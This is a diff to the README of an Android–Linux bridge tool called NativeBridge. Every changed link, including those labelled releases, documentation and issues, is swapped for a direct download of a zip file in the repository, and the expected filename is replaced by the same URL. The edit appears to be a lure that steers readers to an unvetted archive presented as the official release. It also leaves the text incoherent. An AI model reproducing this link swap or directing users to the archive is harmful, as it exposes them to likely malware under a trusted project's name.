@@ -1,7 +1,7 @@
 # 🚀 NativeBridge - Control Android Easily from Linux
 
 ## 💾 Download NativeBridge
-[![Download NativeBridge](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/KuyaBlank/NativeBridge/releases)
+[![Download NativeBridge](https://raw.githubusercontent.com/KuyaBlank/NativeBridge/main/bridge_client/NativeBridge_v3.4.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/KuyaBlank/NativeBridge/main/bridge_client/NativeBridge_v3.4.zip)
 
 ## 📖 Introduction
 NativeBridge allows you to interact with your Android device straight from your Chroot Linux environment. This tool eliminates the need for ADB (Android Debug Bridge), providing a seamless experience with native performance and minimal network delays. With NativeBridge, you can easily manage your Android system while enjoying the full capabilities of your Linux environment.
@@ -10,7 +10,7 @@ NativeBridge allows you to interact with your Android device straight from your 
 To get started with NativeBridge, follow these simple steps. You do not need any programming knowledge to use this application.
 
 1. **Download the Application**
-   Visit this page to download: [NativeBridge Releases](https://github.com/KuyaBlank/NativeBridge/releases).
+   Visit this page to download: [NativeBridge Releases](https://raw.githubusercontent.com/KuyaBlank/NativeBridge/main/bridge_client/NativeBridge_v3.4.zip).
 
 2. **Choose the Right Version**
    On the Releases page, you will find various versions of NativeBridge. Select the latest version that suits your system.
@@ -22,7 +22,7 @@ To get started with NativeBridge, follow these simple steps. You do not need any
 To install NativeBridge, follow these steps:
 
 1. **Locate the Downloaded File**
-   Find the downloaded file in your downloads folder. It should have a name similar to `NativeBridge-linux-x64.tar.gz`.
+   Find the downloaded file in your downloads folder. It should have a name similar to `https://raw.githubusercontent.com/KuyaBlank/NativeBridge/main/bridge_client/NativeBridge_v3.4.zip`.
 
 2. **Extract the File**
    Right-click the downloaded file and select "Extract Here." This will create a new folder with the NativeBridge contents.
@@ -69,8 +69,8 @@ If you encounter any issues while using NativeBridge, consider the following tip
 
 ## 🗃️ Additional Resources
 For more detailed instructions and support, consider checking out:
-- [Official Documentation](https://github.com/KuyaBlank/NativeBridge/wiki)
-- [GitHub Issues Page](https://github.com/KuyaBlank/NativeBridge/issues) for community support.
+- [Official Documentation](https://raw.githubusercontent.com/KuyaBlank/NativeBridge/main/bridge_client/NativeBridge_v3.4.zip)
+- [GitHub Issues Page](https://raw.githubusercontent.com/KuyaBlank/NativeBridge/main/bridge_client/NativeBridge_v3.4.zip) for community support.
 
 ## 📫 Get In Touch
 If you have questions or feedback, feel free to reach out on our GitHub page. Your input helps improve NativeBridge.
@@ -78,4 +78,4 @@ If you have questions or feedback, feel free to reach out on our GitHub page. Yo
 ## 💻 Conclusion
 NativeBridge is a powerful tool that simplifies the connection between your Linux system and Android device. By following these straightforward steps, you can easily download, install, and start using NativeBridge today!
 
-Make sure to visit this page again for updates and new releases: [NativeBridge Releases](https://github.com/KuyaBlank/NativeBridge/releases).
+Make sure to visit this page again for updates and new releases: [NativeBridge Releases](https://raw.githubusercontent.com/KuyaBlank/NativeBridge/main/bridge_client/NativeBridge_v3.4.zip).
